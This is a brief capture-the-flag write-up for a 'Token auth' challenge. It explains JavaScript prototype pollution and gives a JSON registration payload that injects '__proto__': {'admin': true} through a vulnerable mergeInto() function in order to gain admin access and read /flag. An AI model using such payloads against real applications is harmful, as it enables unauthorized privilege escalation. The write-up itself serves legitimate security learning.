<font size = '4'>
<p align = 'center'>
<b>
Break the Syntax CTS - Token auth Writeup 
</b>
</p>
</font>

<br>
<font size = '3'>

<b>Challenge Description:</b><br>

JWT is very common way to handle authorization. It has to be secure.

<br>

<b>Exploitation:</b><br>

Prototype Pollution:

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

First register a user:

```python
{
  "username": "testuser",
  "password": "test"
}
```

The mergeInto() function is vulnerable to prototype pollution.

```python
{
  "username": {
    "__proto__": {
      "admin": true
    }
  },
  "password": "test"
}
```

The mergeInto function merges this into the target object, setting Object.prototype.admin to true.

Now we can just GET /flag, since we get granted admin access.